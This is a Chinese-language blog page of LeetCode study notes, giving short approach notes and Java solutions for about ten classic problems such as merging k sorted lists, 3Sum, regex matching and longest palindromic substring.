<h3 id="23-合并-K-个升序链表"><a href="#23-合并-K-个升序链表" class="headerlink" title="23. 合并 K 个升序链表"></a><a href="https://leetcode.cn/problems/merge-k-sorted-lists/">23. 合并 K 个升序链表</a></h3><p>思路：是合并两个有序链表的升级，看范围列表个数小于500，长度小于10^4。如果我们每次都遍历的话复杂度为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">500*10^4*500</span><br></pre></td></tr></table></figure>

<p>如果我们使用高效数据结构，快速获得链表当前头部最小值，那么可以再快点。</p>
<p>代码（采用第二种思路）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        <span class="type">int</span> index;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> value, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.index = index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> lists.length;</span><br><span class="line">        ListNode[] cur = <span class="keyword">new</span> <span class="title class_">ListNode</span>[n];</span><br><span class="line">        PriorityQueue&lt;Node&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Node&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Node o1, Node o2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> o1.value - o2.value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(lists[i] != <span class="literal">null</span>)&#123;</span><br><span class="line">                cur[i] = lists[i];</span><br><span class="line">                priorityQueue.add(<span class="keyword">new</span> <span class="title class_">Node</span>(lists[i].val, i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curPreNode</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span> (!priorityQueue.isEmpty())&#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> priorityQueue.poll();</span><br><span class="line">            curPreNode.next = cur[node.index];</span><br><span class="line">            curPreNode = curPreNode.next;</span><br><span class="line">            cur[node.index] = cur[node.index].next;</span><br><span class="line">            <span class="keyword">if</span>(cur[node.index] != <span class="literal">null</span>)&#123;</span><br><span class="line">                priorityQueue.add(<span class="keyword">new</span> <span class="title class_">Node</span>(cur[node.index].val, node.index));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二（分治算法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(lists.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> mergeKLists(lists, <span class="number">0</span>, lists.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == right) <span class="keyword">return</span> lists[left];</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;<span class="comment">//left &lt;= mid &lt; right</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">listNode1</span> <span class="operator">=</span> mergeKLists(lists, left, mid);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">listNode2</span> <span class="operator">=</span> mergeKLists(lists, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> mergeTwoLists(listNode1, listNode2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node1</span> <span class="operator">=</span> list1;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node2</span> <span class="operator">=</span> list2;</span><br><span class="line">        <span class="keyword">while</span> (node1 != <span class="literal">null</span> &amp;&amp; node2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(node1.val &lt; node2.val)&#123;</span><br><span class="line">                cur.next = node1;</span><br><span class="line">                node1 = node1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur.next = node2;</span><br><span class="line">                node2 = node2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node1 != <span class="literal">null</span>) cur.next = node1;</span><br><span class="line">        <span class="keyword">if</span>(node2 != <span class="literal">null</span>) cur.next = node2;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="560-和为-K-的子数组"><a href="#560-和为-K-的子数组" class="headerlink" title="560. 和为 K 的子数组"></a><a href="https://leetcode.cn/problems/subarray-sum-equals-k/">560. 和为 K 的子数组</a></h3><p>思路前缀和+ 哈希表</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subarraySum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            preSum[i + <span class="number">1</span>] = preSum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Integer, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        record.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">//preSum[i] - preSum[j] = k</span></span><br><span class="line">            res += record.getOrDefault(preSum[i + <span class="number">1</span>] - k, <span class="number">0</span>);</span><br><span class="line">            record.merge(preSum[i + <span class="number">1</span>], <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode.cn/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h3><p>思路：使用一个dummyNode来控制下一个结点</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node1</span> <span class="operator">=</span> list1;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node2</span> <span class="operator">=</span> list2;</span><br><span class="line">        <span class="keyword">while</span> (node1 != <span class="literal">null</span> &amp;&amp; node2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(node1.val &lt; node2.val)&#123;</span><br><span class="line">                cur.next = node1;</span><br><span class="line">                node1 = node1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur.next = node2;</span><br><span class="line">                node2 = node2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node1 != <span class="literal">null</span>) cur.next = node1;</span><br><span class="line">        <span class="keyword">if</span>(node2 != <span class="literal">null</span>) cur.next = node2;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><p>思路：栈</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Map&lt;Character, Character&gt;  map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(!map.containsKey(ch))&#123;</span><br><span class="line">                stack.push(ch);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Character</span> <span class="variable">revCh</span> <span class="operator">=</span> map.get(ch);</span><br><span class="line">                <span class="keyword">if</span>(stack.isEmpty() || stack.pop() != revCh) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a><a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/">19. 删除链表的倒数第 N 个结点</a></h3><p>思路：快慢指针。一个指针先走n部，后面一起走。然后返回后走的指针</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        dummyNode.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slow.next = slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17. 电话号码的字母组合"></a><a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></h3><p>思路：搜索 + 记录用hashMap存储</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        Map&lt;Character, String&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        record.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>);</span><br><span class="line">        record.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>);</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(digits, <span class="number">0</span>, digits.length(), record, <span class="string">&quot;&quot;</span>, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(String digits, <span class="type">int</span> i, <span class="type">int</span> n, Map&lt;Character, String&gt; record, String prev, List&lt;String&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!prev.isEmpty()) res.add(prev);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> digits.charAt(i);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> record.get(ch);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; s.length(); j++) &#123;</span><br><span class="line">            dfs(digits, i + <span class="number">1</span>, n, record, prev + s.charAt(j), res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h3><p>思路：排序 + 双指针</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sumTarget</span> <span class="operator">=</span> -nums[i];</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">                <span class="keyword">while</span> (left != i + <span class="number">1</span> &amp;&amp; left &lt; n &amp;&amp; nums[left] == nums[left - <span class="number">1</span>]) left++;</span><br><span class="line">                <span class="keyword">while</span> (right != n - <span class="number">1</span> &amp;&amp; right &gt; i &amp;&amp; nums[right] == nums[right + <span class="number">1</span>]) right--;</span><br><span class="line">                <span class="keyword">if</span>(left &lt; right)&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[left] + nums[right];</span><br><span class="line">                    <span class="keyword">if</span>(sum == sumTarget)&#123;</span><br><span class="line">                        res.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line">                        left++;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; sumTarget)&#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11. 盛最多水的容器"></a><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></h3><p>思路：滑动窗口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始化left = 0 right = n - 1</span><br><span class="line">arr[left] &gt; arr[right] 那么能够排除掉arr[i][right] （left &lt; i &lt; right）。所以可以方向移动right，不用担心错过正确答案</span><br><span class="line">哪个对应的值更小就移动哪个。（因为移动更大的结果只会变小）。</span><br></pre></td></tr></table></figure>

<p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxArea(int[] height) &#123;</span><br><span class="line">        int res = 0;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int right = height.length - 1;</span><br><span class="line">        while (left &lt; right)&#123;</span><br><span class="line">            res = Integer.max(res, (right - left) * Integer.min(height[left], height[right]));</span><br><span class="line">            if(height[left] &lt; height[right]) left++;</span><br><span class="line">            else right--;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="70题了"><a href="#70题了" class="headerlink" title="70题了"></a>70题了</h3><h3 id="10-正则表达式匹配"><a href="#10-正则表达式匹配" class="headerlink" title="10. 正则表达式匹配"></a><a href="https://leetcode.cn/problems/regular-expression-matching/">10. 正则表达式匹配</a></h3><p>思路：dp + 分析完全</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//只有(ch)*才能匹配空字符</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt;= n; j += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p.charAt(j - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>) dp[<span class="number">0</span>][j] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//然后开始想下状态转移方程在写递推顺序</span></span><br><span class="line">        <span class="comment">//dp[i][j] =</span></span><br><span class="line">        <span class="comment">//(p[j]其实是p.charAt(j-1)) p[j] = ch ,dp[i][j] = dp[i-1][j-1] &amp; (s[i] == p[j])</span></span><br><span class="line">        <span class="comment">// p[j] = &#x27;.&#x27; dp[i][j] = dp[i-1][j-1]</span></span><br><span class="line">        <span class="comment">// p[j] = &#x27;*&#x27; 这个时候要复杂点，要讨论情况。 p[j-1] = ch , 有两种情况：一、匹配空字符串，二重复匹配n次。</span></span><br><span class="line">        <span class="comment">// 匹配空字符串时 dp[i][j] = dp[i][j - 2] </span></span><br><span class="line">        <span class="comment">// 重复匹配n 次时 ，判断当前字符是否是ch 即可 ， dp[i][j] = dp[i - 1][j - 2] &amp; （p[j-1] == s[i]）的话是默认只匹配了一次不行。 得 dp[i-1][j]转移，dp[i-1][j]为true有两种情况</span></span><br><span class="line">        <span class="comment">// 一种是(ch)*为空，一种是(ch)*重复。我们是否需要区分这两种情况？  如果dp[i-1][j] 的 (ch) * 为空，无所谓 我现在不为空为一了，那么 dp[i][j]也无问题。如果dp[i-1][j]不为空</span></span><br><span class="line">        <span class="comment">//，那无所谓在加一个也行</span></span><br><span class="line">        <span class="comment">// .*分析同理</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(p.charAt(j - <span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(p.charAt(j - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(p.charAt(j - <span class="number">2</span>) != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        dp[i][j] = (dp[i - <span class="number">1</span>][j] &amp; (s.charAt(i - <span class="number">1</span>) == p.charAt(j - <span class="number">2</span>))) | (dp[i][j - <span class="number">2</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        dp[i][j] = dp[i - <span class="number">1</span>][j] | (dp[i][j - <span class="number">2</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp; (s.charAt(i - <span class="number">1</span>) == p.charAt(j - <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5. 最长回文子串"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h3><p>思路：中心扩散法</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">retStr</span> <span class="operator">=</span> s.substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (left - <span class="number">1</span> &gt;=<span class="number">0</span> &amp;&amp; right + <span class="number">1</span> &lt; n &amp;&amp; s.charAt(left - <span class="number">1</span>) == s.charAt(right + <span class="number">1</span>))&#123;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curLength</span> <span class="operator">=</span> (right - left + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(curLength &gt; maxLength)&#123;</span><br><span class="line">                maxLength = curLength;</span><br><span class="line">                retStr = s.substring(left, left + curLength);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) != s.charAt(i - <span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (left - <span class="number">1</span> &gt;=<span class="number">0</span> &amp;&amp; right + <span class="number">1</span> &lt; n &amp;&amp; s.charAt(left - <span class="number">1</span>) == s.charAt(right + <span class="number">1</span>))&#123;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curLength</span> <span class="operator">=</span> (right - left + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(curLength &gt; maxLength)&#123;</span><br><span class="line">                maxLength = curLength;</span><br><span class="line">                retStr = s.substring(left, left + curLength);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retStr;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:添加动态规划、Manacher 写法</p>
